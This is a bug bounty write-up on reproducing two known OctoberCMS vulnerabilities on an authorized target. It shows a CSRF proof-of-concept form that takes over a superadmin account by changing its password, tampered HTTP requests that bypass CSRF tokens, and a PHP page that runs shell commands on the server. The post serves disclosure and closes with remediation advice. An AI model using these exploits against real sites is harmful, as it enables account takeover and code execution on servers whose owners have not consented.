---
layout: post
title: How I Discovered Two Old CVEs in The OctoberCMS
date: 2025-05-28
permalink: /blogs/octobercms-old-cves.html
---

In this blog post, I'll demonstrate on how I found two old CVEs in old OctoberCMS from the private bug bounty program.

# Table of Contents
- [Overview](#overview)
- [CVE-2017-16244: Authenticated CSRF](#cve-2017-16244-authenticated-csrf)
  - [Analysis](#cve-2017-16244-analysis)
  - [Exploit](#cve-2017-16244-exploit)
- [CVE-2022-21705: Authenticated RCE](#cve-2022-21705-authenticated-rce)
  - [Analysis](#cve-2022-21705-analysis)
  - [Exploit](#cve-2022-21705-exploit)
- [Remediation](#remediation)
  - [Patching Timeline](#patching-timeline)
- [References/Sources](#referencessources)

# [Overview](#overview)

I had a private bug bounty program assignment, which was targeting on a CMS. While I was given the superadmin credentials, that doesn't mean there will be any vulnerabilities from the external threat actors. In fact, there will be any internal threat actors to exploit such attacks, even if the superadmin credentials have followed the strong password policy that I was given for the engagement.

The victim has running OctoberCMS on Version 1.0 Build 459, which was released on September 11th, 2019. Although the CMS was built six years ago, there will be many uncovered vulnerabilities, whether the old or the latest ones. 

> 📝 To protect some victim and email credentials, I manipulate the image screenshots' that contains credentials with my own pretext/fake credentials, or even colored markers, although the attacks were successful.

---

# [CVE-2017-16244: Authenticated CSRF](#cve-2017-16244-authenticated-csrf)

When users log into the web application, performing requests, or editing the user/admin profile details, every requests has a **cross-site request forgery** (CSRF) tokens, which prevents attackers to perform CSRF to alter such requests, especially perform actions that the victims/users don’t intend to perform. By using the same attack method, the attacker or threat actor can also evade the same origin policy (SOP), which is designed to prevent different websites from interfering with each other.

In OctoberCMS, the CSRF exists due to the improper validation of CSRF tokens for postback handling. This allows the threat actor to interfere the requests, specifically take over the victim’s account by bypassing a CSRF protection mechanism that involves `X-CSRF` headers, as well as CSRF tokens through a POST data request. Threat actors can bypass such tokens using a postback variable `_handler=` that sent through the POST data request.

This CVE was found in OctoberCMS v1.0.426 due to the no validation on CSRF tokens when the `_handler` data parameter was used to make the request. After the latest version over v1.0.426, the CSRF token validation was implemented by default to prevent any CSRF bypass attacks.

## [CVE-2017-16244 Analysis](#cve-2017-16244-analysis)

During the engagement, I found that the current version the victim's CMS is using, is still affected with the authenticated CSRF based on the CVE-2017-16244 due to the no CSRF validation, even I was tried using the `_handler` data parameter to bypass it.

The following request at that time shows how the users change their super admin profile on the OctoberCMS admin page.

```
POST /some-endpoint/backend/users/myaccount HTTP/2
Host: victim-site.com
...SNIP...
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-October-Request-Handler: onSave
X-October-Request-Partials: 
X-Csrf-Token: <some-csrf-token>
X-Requested-With: XMLHttpRequest
Content-Length: 280
Origin: https://victim-site.com
Referer: https://victim-site.com/some-endpoint/backend/users/myaccount
...SNIP...

_session_key=<value>&_token=<value>&User%5Blogin%5D=superadmin&User%5Bemail%5D=victim%40mail.com&User%5Bfirst_name%5D=MyVictim&User%5Blast_name%5D=Admin&User%5Bpassword%5D=&User%5Bpassword_confirmation%5D=&redirect=0
```

![20250518170525.png](/assets/octobercms-cves/20250518170525.png)

To bypass the CSRF tokens, I the entire `X-CSRF` and all of proprietary (`X-`) headers, as well as overwriting the `_session_key=<value>` and `_token=<value>` data parameters with the new data `_handler=onSave`, which the value `onSave` is obtained from the header value `X-October-Request-Handler: onSave`.

```
POST /some-endpoint/backend/users/myaccount HTTP/2
Host: victim-site.com
...SNIP...
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 280
Origin: https://victim-site.com
Referer: https://victim-site.com/some-endpoint/backend/users/myaccount
...SNIP...

_handler=onSave&User%5Blogin%5D=basicadmin&User%5Bemail%5D=attacker%40mail.com&User%5Bfirst_name%5D=MyAttacker&User%5Blast_name%5D=AdminBasic&User%5Bpassword%5D=&User%5Bpassword_confirmation%5D=&redirect=0
```

After tampering with such requests, I successfully edit the user profiles with CSRF token bypass.

![20250518170620.png](/assets/octobercms-cves/20250518170620.png)

## [CVE-2017-16244 Exploit](#cve-2017-16244-exploit)

After some time, I found a video PoC, which I'll put it on the [**References/Sources**](#referencessources) section, on how to create the CSRF. I put the HTML script under the file `csrf-test.html`

```html
<html>
  <body>
    <form action="https://victim-site.com/some-endpoint/backend/users/myaccount" method="POST">
      <input type="hidden" name="&#95;handler" value="onSave" />
      <input type="hidden" name="User&#91;login&#93;" value="kedaiesteh" />
      <input type="hidden" name="User&#91;email&#93;" value="kedaiesteh&#64;email&#46;com" />
      <input type="hidden" name="User&#91;first&#95;name&#93;" value="PoC" />
      <input type="hidden" name="User&#91;last&#95;name&#93;" value="EsTeh" />
      <input type="hidden" name="User&#91;password&#93;" value="secret1234" />
      <input type="hidden" name="User&#91;password&#95;confirmation&#93;" value="secret1234" />
      <input type="hidden" name="redirect" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

- The HTML script above not only changes the user profiles, but also change the password to perform the account takeover.
- To successfully exploit the CSRF, the threat actor **must have the current superadmin session enabled** on the browser.

Once I launch the HTML file in the browser, I clicked the button, and all of the profiles have been changed successfully, including the password that I've successfully changed as well.

![20250518173405.png](/assets/octobercms-cves/20250518173405.png)

After I clicked the `Submit request` button, I successfully took over the superadmin account through my CSRF page.

![20250518173627.png](/assets/octobercms-cves/20250518173627.png)

I can also successfully changed the password of the superadmin's password as well.

![20250518173737.png](/assets/octobercms-cves/20250518173737.png)

---

# [CVE-2022-21705: Authenticated RCE](#cve-2022-21705-authenticated-rce)

The OctoberCMS has a page editor feature that allows users, especially superusers/admins, to manage and modify templates and page contents of the web application service. There are two methods of page editor that the users can use along with their security mechanisms to prevent untrusted users from executing arbitrary command injections:

- **Markup Tab**: Protected by a sandboxed Twig environment
- **Code Tab**: Protected by the “Safe Mode” configuration option

However, developers often overlooked the “Safe Mode” config option, leading to some malicious (authenticated) users able to run arbitrary PHP via the page editor.

This CVE was found on 2022, affecting OctoberCMS version 1.0, 1.1, and 2.1, which also effects on version 1.0.459, the current build that runs on the victim’s OctoberCMS.

## [CVE-2022-21705 Analysis](#cve-2022-21705-analysis)

This analysis shows how both tab methods, **Markup** and **Code**, are handled in the back-end, as well as how OctoberCMS stores page contents on disk. According to the analysis written by `cyllective` (the PoC is also available on the [**References/Sources**](#referencessources) section), there are two pages that has been made, one that was built on **Markup Tab**, and the second page was built with additional **Code Tab** contents.

- First page
    ```
    title = "page_without_code"
    url = "/page_without_code"
    description = "description_field"
    meta_title = "meta_title"
    meta_description = "meta_description"
    is_hidden = 0
    ```

- Second page
    ```
    title = "page_with_code"
    url = "/page_with_code"
    description = "description_field"
    meta_title = "meta_title"
    meta_description = "meta_description"
    is_hidden = 0
    ==
    <?php
    	code_content
    ?>
    ```

After further analysis, the writer examined that the POST data of the web page has restructured into three sections via a call to [`SectionParser::render` ↗](https://github.com/octobercms/library/blob/6146e461e5156e4d612444852967c976405e9e6b/src/Halcyon/Processors/SectionParser.php#L23).

The sections written to disk are separated by double equal signs `==` and are split up like so:
1. **Settings:** stores page metadata (title, URL, description, etc.)
2. **Code:** stores the contents of the “Code” tab
3. **Markup:** stores the contents of the “Markup” tab

By smuggling the arbitrary PHP command in a PoC page through the **Code Tab**, I found another RCE vulnerability based on the aforementioned CVE, which was existed due to the no validation of running arbitrary PHP commands.

## [CVE-2022-21705 Exploit](#cve-2022-21705-exploit)

To begin, I created a page `/poc-rce` the CMS.

![20250518154532.png](/assets/octobercms-cves/20250518154532.png)

Then, I created two codes in the CMS within the following
- **Markup Tab**
    ```php
    <?php
    // jruk lmao haha
    ?>
    ==
    markup_content, nothing to see here.
    ```
- **Code Tab**
    ```php
    <?php
    function onInit() {
        passthru('id');
        passthru('uname -a');
        passthru('whoami');
    }
    ==
    Hello World.
    ```

Finally, I saved the new `/poc-rce` endpoint and access to it, in order to verify.

![20250518155100.png](/assets/octobercms-cves/20250518155100.png)

Command output legend from the **Code Tab**
- Red: `id`
- Yellow/Orange: `uname -a` 
- Green: `whoami`

---

# [Remediation](#remediation)

Within both of CVEs found, fortunately, the developer team has patched the vulnerabilities quickly before the end-of-day. The remediation advice that I should share in this blog are:
- Ensure to implement and validate the CSRF token, as well as validating the POST data request that includes `_handler` data parameter.
- Add the parsing function on the CMS configuration to prevent of running arbitrary PHP command.
- Add the *Save Mode Validation* on both page editor tabs to prevent another RCE attacks.
- Lastly, perform software updates to prevent any upcoming further attacks that may target the company's trust and data retention.

## [Patching Timeline](#patching-timeline)

- **April 28th, 2025 —** Found both CVEs
- **April 28th, 2025 —** Reported to the team
- **April 28th, 2025 —** The team fixed the vulnerability
- **April 28th, 2025 —** The CVEs has been patched

---

# [References/Sources](#referencessources)

- [CVE-2017-16244 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16244)
  - [ExploitDB Proof-of-Concept](https://www.exploit-db.com/exploits/43106)
  - [YouTube Video Proof-of-Concept](https://www.youtube.com/watch?v=EDQJI8EGsuI)
  - [GitHub Security Advisories](https://github.com/advisories/GHSA-vm6r-4p4v-232x)
- [CVE-2022-21705 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21705)
  - [Blog Proof-of-Concept](https://cyllective.com/blog/posts/cve-2022-21705-octobercms)
  - [GitHub Security Advisories](https://github.com/advisories/GHSA-vm6r-4p4v-232x)